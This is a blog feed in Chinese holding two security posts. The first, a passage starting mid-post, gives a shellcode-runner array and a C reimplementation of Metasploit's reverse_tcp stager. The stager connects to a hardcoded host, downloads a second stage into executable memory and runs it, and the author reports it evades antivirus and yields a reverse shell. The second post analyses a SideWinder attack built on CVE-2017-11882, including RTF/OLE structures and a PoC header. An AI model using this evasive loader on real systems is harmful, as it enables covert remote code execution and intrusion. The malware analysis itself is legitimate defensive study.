class="symbol">\x</span>44"</div><div class="line">"<span class="symbol">\x</span>84<span class="symbol">\x</span>ca<span class="symbol">\x</span>8c<span class="symbol">\x</span>2a<span class="symbol">\x</span>44<span class="symbol">\x</span>d8<span class="symbol">\x</span>3d<span class="symbol">\x</span>17<span class="symbol">\x</span>24<span class="symbol">\x</span>ab<span class="symbol">\x</span>c6<span class="symbol">\x</span>6d<span class="symbol">\x</span>69<span class="symbol">\x</span>0f<span class="symbol">\x</span>72"</div><div class="line">"<span class="symbol">\x</span>cb<span class="symbol">\x</span>31<span class="symbol">\x</span>62<span class="symbol">\x</span>19<span class="symbol">\x</span>a9<span class="symbol">\x</span>4a<span class="symbol">\x</span>d1<span class="symbol">\x</span>f9<span class="symbol">\x</span>5c<span class="symbol">\x</span>e0<span class="symbol">\x</span>4e<span class="symbol">\x</span>d6<span class="symbol">\x</span>23<span class="symbol">\x</span>d9<span class="symbol">\x</span>86"</div><div class="line">"<span class="symbol">\x</span>d8<span class="symbol">\x</span>60<span class="symbol">\x</span>cf<span class="symbol">\x</span>55<span class="symbol">\x</span>9c<span class="symbol">\x</span>6b<span class="symbol">\x</span>1c<span class="symbol">\x</span>92<span class="symbol">\x</span>ca<span class="symbol">\x</span>37<span class="symbol">\x</span>11<span class="symbol">\x</span>51<span class="symbol">\x</span>04<span class="symbol">\x</span>44<span class="symbol">\x</span>e2"</div><div class="line">"<span class="symbol">\x</span>fa<span class="symbol">\x</span>05<span class="symbol">\x</span>e4<span class="symbol">\x</span>95<span class="symbol">\x</span>a5<span class="symbol">\x</span>4e<span class="symbol">\x</span>f2<span class="symbol">\x</span>70<span class="symbol">\x</span>d5<span class="symbol">\x</span>20<span class="symbol">\x</span>7c<span class="symbol">\x</span>ec<span class="symbol">\x</span>99<span class="symbol">\x</span>05<span class="symbol">\x</span>7f"</div><div class="line">"<span class="symbol">\x</span>f2<span class="symbol">\x</span>ad<span class="symbol">\x</span>87<span class="symbol">\x</span>36<span class="symbol">\x</span>ba<span class="symbol">\x</span>74<span class="symbol">\x</span>4c<span class="symbol">\x</span>e8<span class="symbol">\x</span>30<span class="symbol">\x</span>3c<span class="symbol">\x</span>36<span class="symbol">\x</span>7a<span class="symbol">\x</span>e7<span class="symbol">\x</span>18<span class="symbol">\x</span>bb"</div><div class="line">"<span class="symbol">\x</span>40<span class="symbol">\x</span>88<span class="symbol">\x</span>93<span class="symbol">\x</span>e3<span class="symbol">\x</span>19<span class="symbol">\x</span>86<span class="symbol">\x</span>da<span class="symbol">\x</span>9a<span class="symbol">\x</span>4b<span class="symbol">\x</span>ab<span class="symbol">\x</span>b2<span class="symbol">\x</span>bb<span class="symbol">\x</span>8e<span class="symbol">\x</span>bf<span class="symbol">\x</span>63"</div><div class="line">"<span class="symbol">\x</span>52<span class="symbol">\x</span>bc<span class="symbol">\x</span>8d";</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">((void(*)())&amp;lpBinBuffer)();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20210829/OiAyqzupMi48.png?imageslim" alt="mark"></p><h2 id="0x3-关于免杀的新思考"><a href="#0x3-关于免杀的新思考" class="headerlink" title="0x3 关于免杀的新思考"></a>0x3 关于免杀的新思考</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当我查看metasploit-framework源码的时候，在%metasploit-framework%/lib/msf/core/payload/windows/reverse_tcp.rb下看到了关于reverse_tcp这个payload的源码，发现实现reverse_tcp的方法很简单。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，调用WSAStartup，connect等一系列Windows Socket函数链接主机。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">reverse_tcp:</span></div><div class="line">  <span class="keyword">push</span> <span class="string">'32'</span>               <span class="comment">; Push the bytes 'ws2_32',0,0 onto the stack.</span></div><div class="line">  <span class="keyword">push</span> <span class="string">'ws2_'</span>             <span class="comment">; ...</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esp</span>                <span class="comment">; Push a pointer to the "ws2_32" string on the stack.</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'kernel32.dll'</span>, <span class="string">'LoadLibraryA'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; LoadLibraryA( "ws2_32" )</span></div><div class="line"></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x0190</span>         <span class="comment">; EAX = sizeof( struct WSAData )</span></div><div class="line">  <span class="keyword">sub</span> <span class="built_in">esp</span>, <span class="built_in">eax</span>            <span class="comment">; alloc some space for the WSAData structure</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esp</span>                <span class="comment">; push a pointer to this stuct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push the wVersionRequested parameter</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'WSAStartup'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; WSAStartup( 0x0190, &amp;WSAData );</span></div><div class="line"></div><div class="line"><span class="symbol">set_address:</span></div><div class="line">  <span class="keyword">push</span> #&#123;retry_count&#125;     <span class="comment">; retry counter</span></div><div class="line"></div><div class="line"><span class="symbol">create_socket:</span></div><div class="line">  <span class="keyword">push</span> #&#123;encoded_host&#125;    <span class="comment">; host in little-endian format</span></div><div class="line">  <span class="keyword">push</span> #&#123;encoded_port&#125;    <span class="comment">; family AF_INET and port number</span></div><div class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="built_in">esp</span>            <span class="comment">; save pointer to sockaddr struct</span></div><div class="line"></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; if we succeed, eax will be zero, push zero for the flags param.</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push null for reserved parameter</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; we do not specify a WSAPROTOCOL_INFO structure</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; we do not specify a protocol</span></div><div class="line">  <span class="keyword">inc</span> <span class="built_in">eax</span>                 <span class="comment">;</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push SOCK_STREAM</span></div><div class="line">  <span class="keyword">inc</span> <span class="built_in">eax</span>                 <span class="comment">;</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                <span class="comment">; push AF_INET</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'WSASocketA'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span></div><div class="line">  <span class="keyword">xchg</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>           <span class="comment">; save the socket for later, don't care about the value of eax after this</span></div><div class="line"></div><div class="line"><span class="symbol">try_connect:</span></div><div class="line">  <span class="keyword">push</span> <span class="number">16</span>                 <span class="comment">; length of the sockaddr struct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; pointer to the sockaddr struct</span></div><div class="line">  <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the socket</span></div><div class="line">  <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'connect'</span>)&#125;</div><div class="line">  <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; connect( s, &amp;sockaddr, 16 );</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用recv用于接收第二个stage的大小。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">def asm_block_recv(opts=&#123;&#125;)</div><div class="line">  reliable     = opts[:reliable]</div><div class="line">  asm = %Q^</div><div class="line"><span class="symbol">    recv:</span></div><div class="line">      <span class="comment">; Receive the size of the incoming second stage...</span></div><div class="line">      <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; flags</span></div><div class="line">      <span class="keyword">push</span> <span class="number">4</span>                  <span class="comment">; length = sizeof( DWORD );</span></div><div class="line">      <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; the 4 byte buffer on the stack to hold the second stage length</span></div><div class="line">      <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the saved socket</span></div><div class="line">      <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'recv'</span>)&#125;</div><div class="line">      <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; recv( s, &amp;dwLength, 4, 0 );</span></div><div class="line">  ^</div><div class="line"></div><div class="line">  if reliable</div><div class="line">    asm &lt;&lt; %Q^</div><div class="line">      <span class="comment">; reliability: check to see if the recv worked, and reconnect</span></div><div class="line">      <span class="comment">; if it fails</span></div><div class="line">      <span class="keyword">cmp</span> <span class="built_in">eax</span>, <span class="number">0</span></div><div class="line">      <span class="keyword">jle</span> cleanup_socket</div><div class="line">    ^</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着，调用recv接收第二个stage的内容，然后执行stage。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">asm &lt;&lt; %Q^</div><div class="line">    <span class="comment">; Alloc a RWX buffer for the second stage</span></div><div class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">esi</span>]          <span class="comment">; dereference the pointer to the second stage length</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0x40</span>               <span class="comment">; PAGE_EXECUTE_READWRITE</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0x1000</span>             <span class="comment">; MEM_COMMIT</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; push the newly recieved second stage length.</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; NULL as we dont care where the allocation is.</span></div><div class="line">    <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'kernel32.dll'</span>, <span class="string">'VirtualAlloc'</span>)&#125;</div><div class="line">    <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span></div><div class="line">    <span class="comment">; Receive the second stage and execute it...</span></div><div class="line">    <span class="keyword">xchg</span> <span class="built_in">ebx</span>, <span class="built_in">eax</span>           <span class="comment">; ebx = our new memory address for the new stage</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span>                <span class="comment">; push the address of the new stage so we can return into it</span></div><div class="line"></div><div class="line"><span class="symbol">  read_more:</span></div><div class="line">    <span class="keyword">push</span> <span class="number">0</span>                  <span class="comment">; flags</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">esi</span>                <span class="comment">; length</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span>                <span class="comment">; the current address into our second stage's RWX buffer</span></div><div class="line">    <span class="keyword">push</span> <span class="built_in">edi</span>                <span class="comment">; the saved socket</span></div><div class="line">    <span class="keyword">push</span> #&#123;Rex::Text.block_api_hash(<span class="string">'ws2_32.dll'</span>, <span class="string">'recv'</span>)&#125;</div><div class="line">    <span class="keyword">call</span> <span class="built_in">ebp</span>                <span class="comment">; recv( s, buffer, length, 0 );</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来事情就简单了，我重新仿写了一个stage，因为metasploit通过Hash获取函数地址，虽然Hash值会被加密，但是仍有可能被识别。然后为了减少通过API识别的可能性，我并不想直接调用API函数，或者间接调用API函数，我决定通过仿写GetProcAddress函数，获取各个函数的地址，然后获取第二个Stage并调用。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line">   <span class="comment">//load ws2_32</span></div><div class="line">HMODULE hModule_ws2 = LoadLibraryA(<span class="string">"ws2_32.dll"</span>);</div><div class="line">HMODULE hModule_kernel32 = LoadLibraryA(<span class="string">"Kernel32.dll"</span>);</div><div class="line">fnWSAStartup WSAStartup = (fnWSAStartup)MyGetFuncAddr(hModule_ws2, <span class="string">"WSAStartup"</span>);</div><div class="line">fnWSASocket WSASocketA = (fnWSASocket)MyGetFuncAddr(hModule_ws2, <span class="string">"WSASocketA"</span>);</div><div class="line">fnconnect connect = (fnconnect)MyGetFuncAddr(hModule_ws2, <span class="string">"connect"</span>);</div><div class="line">fnrecv recv = (fnrecv)MyGetFuncAddr(hModule_ws2, <span class="string">"recv"</span>);</div><div class="line">fnVirtualAlloc VirtualAlloc = (fnVirtualAlloc)MyGetFuncAddr(hModule_kernel32, <span class="string">"VirtualAlloc"</span>);</div><div class="line"></div><div class="line"></div><div class="line">WSADATA wsaData;</div><div class="line"><span class="keyword">int</span> iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</div><div class="line"><span class="keyword">if</span> (iResult != NO_ERROR)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]WSAStartup"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">SOCKET socket = WSASocketA(AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == socket)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]WSASocketA"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">SOCKADDR_IN Sockaddr;</div><div class="line">Sockaddr.sin_family = AF_INET;</div><div class="line">Sockaddr.sin_addr.s_addr = inet_addr(<span class="string">"10.10.10.293"</span>);</div><div class="line">Sockaddr.sin_port = htons(<span class="number">4444</span>);</div><div class="line">iResult = connect(socket, (SOCKADDR *)&amp;Sockaddr,<span class="keyword">sizeof</span>(Sockaddr));</div><div class="line"><span class="keyword">if</span> (iResult != NO_ERROR) </div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]connect"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//recv stage length</span></div><div class="line">DWORD dwLength = <span class="number">0</span>;</div><div class="line">iResult = recv(socket, (<span class="keyword">char</span>*)&amp;dwLength, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]recv:%0x"</span>,GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//VirtualAlloc</span></div><div class="line"><span class="keyword">char</span>* lpBinBuffer = <span class="literal">NULL</span>;</div><div class="line">lpBinBuffer = (<span class="keyword">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == lpBinBuffer)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]VirtualAlloc:%0x"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">DWORD dwtotal = <span class="number">0</span>;</div><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//recv stage </span></div><div class="line"><span class="keyword">int</span> iResult = recv(socket, lpBinBuffer+ dwtotal, dwLength - dwtotal, <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]recv:%0x"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line">dwtotal += iResult;</div><div class="line"></div><div class="line">&#125; <span class="keyword">while</span> (dwtotal &lt; dwLength);</div><div class="line"></div><div class="line"><span class="comment">//for (DWORD dwIndex = 0; dwIndex &lt; dwLength; dwIndex++)</span></div><div class="line"><span class="comment">//lpBinBuffer[dwIndex] = lpBinBuffer[dwIndex] ^ 0x123;</span></div><div class="line"></div><div class="line">((<span class="keyword">void</span>(*)())lpBinBuffer)();</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这并不会触发火绒的警报，并能反弹出一个shell<br>    <img src="http://hacky.wang/blog/20210829/l0CM0RnhJcll.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210829/GLP47aq5u0qE.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VT的结果如下。<br>    <img src="http://hacky.wang/blog/20210829/eU5VxoqKJB8I.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过Wireshark抓包，可以看到经过三次握手之后，首先会接收一个四字节的数据，这是stage的大小，然后开辟内存，接收stage的内容。<br>    <img src="http://hacky.wang/blog/20210829/5n0auwYB7zqj.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210829/OFju6eyJjpFU.png?imageslim" alt="mark"></p><h2 id="0x4-基于流量的检测"><a href="#0x4-基于流量的检测" class="headerlink" title="0x4 基于流量的检测"></a>0x4 基于流量的检测</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在上一部分，我们了解到 Metasploit首先会接收四字节的值，然后根据这个值开辟该大小的空间，然后接收Stage的内容。如此的话，可能有人提出，只需要检测网络中的PE数据就可以实现对Metasploit的检测。其实不然，在实网中，数据是杂乱的，有可能数据中也存在白的PE数据，所以不能单纯的检测PE数据来确定。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改源码即可。def handle_connection(conn, opts={})<br><a href="https://github.com/rapid7/metasploit-framework/blob/a1eef6a2c194284fe5e90be602eaa6417db51651/lib/msf/core/payload/stager.rb#L172" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/blob/a1eef6a2c194284fe5e90be602eaa6417db51651/lib/msf/core/payload/stager.rb#L172</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近在学习Metasploit相关的东西，主要是基于msfvenom免杀相关的学习，由于免杀技术日新月异，更新速度快。所以本文只抛砖引玉。欢迎各位师傅探讨交流学习。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="https://findream.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SideWinder某次定向攻击事件的一点思考</title>
    <link href="https://findream.github.io/2020/12/12/SideWinder/"/>
    <id>https://findream.github.io/2020/12/12/SideWinder/</id>
    <published>2020-12-12T07:02:11.000Z</published>
    <updated>2021-11-02T13:51:09.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景与前言"><a href="#背景与前言" class="headerlink" title="背景与前言"></a>背景与前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据360和微步在线公众号披露的情报称，从今年(2020年)11月份起，SideWinder开始策划针对中国的定向攻击。正如360威胁情报中心公众号所说，本次攻击是SideWinder利用邮件等方式传播带有远程模板的恶意文档发动的一次攻击，具体过程如下，首先利用远程模板注入从远程C2服务器上加载含有CVE-2017-11882漏洞的文档，之后执行恶意payload，加载释放在%temp%中的恶意js文件，该js脚本采用内存反射加载的方式执行C#文件，进而部署恶意后门程序。<br><a id="more"></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;觉得这次攻击使用的技术较为新奇，顾在闲暇之时复现了一下本次SideWinder定向攻击，在复现过程了，心中产生了如下3个疑惑：</p><ul><li>1.为何是CVE-2017-11882<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果借用沙箱等动态的方式，通过检测指定的溢出点的数据，自然可以判断出是触发了CVE-2017-11882漏洞。但是如果采用静态分析的方式呢。</li><li>2.RunHTMLApplication如何加载js脚本<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在触发CVE-2017-11882之后执行的恶意的shellcode，最后会通过调用RunHTMLApplication，但是参数皆为null，如何最后执行了释放到%temp%的js脚本</li><li>js脚本是如何反射加载C#程序</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文旨在记录自己在分析中所遇到的种种问题。文中所涉及的样本Hash在微步文章中已给出。各位师傅可自行下载。本人才疏学浅，文中如有错误，请各位积极斧正。</p><h1 id="为何是CVE-2017-11882"><a href="#为何是CVE-2017-11882" class="headerlink" title="为何是CVE-2017-11882"></a>为何是CVE-2017-11882</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<a href="https://www.anquanke.com/post/id/87311" title="银雁冰师傅的文章" target="_blank" rel="external">银雁冰师傅的文章</a>，里面详细描述了漏洞产生的原因和构造poc的方法。据文章中所说的漏洞成因<strong>“是EQNEDT32.EXE进程在读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞.”</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;触发CVE-2017-11882的样本是一个RTF文件，可以采用oletool工具集来查看，但是只能查看其中的对象数据，并不能判断其是触发了那个漏洞。于是，我想到去了解RTF文件格式，继而确定触发漏洞的数据。进而确定是否触发CVE-2017-11882。但是微软的RTF文件格式文档写的较为繁琐，暂时没有从中获取有用的信息。于是我想到可以通过查看rtfobj是如何解析rtf文件的进而学习RTF的文件格式。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过查看rtfobj.py发现，解析rtfobj是通过RtfObjParser.parse函数解析RTF文件的。在RtfObjParser.parse中，rtfobj是根据”{“,”}”,”\“来判断RTF的层级，如果遇到”{“,则层级(level)+1，如果遇到”}”,则层级-1，如果层级为0，说明数据解析完成。<br>    <img src="http://hacky.wang/blog/20201212/2XejeegXjQsV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;熟悉RTF恶意样本的知道，RTF没有宏代码，但是可以通过携带的Ole对象来实现类似于宏代码的操作。而\object字段则表示文件中存在其他格式文件，可以镶嵌图片，链接文件，html等文件。其中\objdata字段则表示存储了对象数据，通常可以Ole对象。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rtfobj中OleObject.parse是于解析\objdata字段的数据，ole对象的结构如下：<br>    <img src="http://hacky.wang/blog/20201212/Rb12gkEWwYB5.png?imageslim" alt="mark"><br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">01050000 </span>   \\OleVersion</div><div class="line"><span class="symbol">02000000 </span>   \\FormatId</div><div class="line"><span class="symbol">08000000 </span>   \\ClassnameSize</div><div class="line"><span class="number">5061636</span>B61676500  \\Classname</div><div class="line"><span class="symbol">00000000 </span>   \\待使用</div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">7</span>a3d0500    \\DataSize </div><div class="line"><span class="number">020...</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并且通过rtfobj代码，发现OLe数据是以小端方式进行存储的,并且除去一些和分析无关的字节，其结构可基本总结为filename,sourcefile,tempfile,以及data字段。由此可见，这一个objdata是一个ole对象，包含一个名为1.a的js文件。这并不是能触发漏洞的objdata。在看一下第二个objdata<br>     <img src="http://hacky.wang/blog/20201212/78jvSC6AjwQy.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二个objdata是Equation.3对象，但是公式编辑器由于自身的问题，存在多个漏洞，所以如何判断该对象会触发CVE-200174-11882呢，我们看一下未经变形的poc。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;\object\objdata </div><div class="line"><span class="number">01050000</span></div><div class="line"><span class="number">02000000</span></div><div class="line"><span class="number">0b000000</span></div><div class="line">4571756174696F6E2E3300</div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">81060000</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据银雁冰师傅在<a href="https://www.anquanke.com/post/id/87311" title="CVE-2017-11882漏洞分析、利用及动态检测" target="_blank" rel="external">CVE-2017-11882漏洞分析、利用及动态检测</a>中从零开始构造POC所描述的那样，Equation Native结构的构成为<code>Equation Native Stream Data = EQNOLEFILEHDR + MTEFData</code>，而<code>MTEFData = MTEF header + MTEF Byte 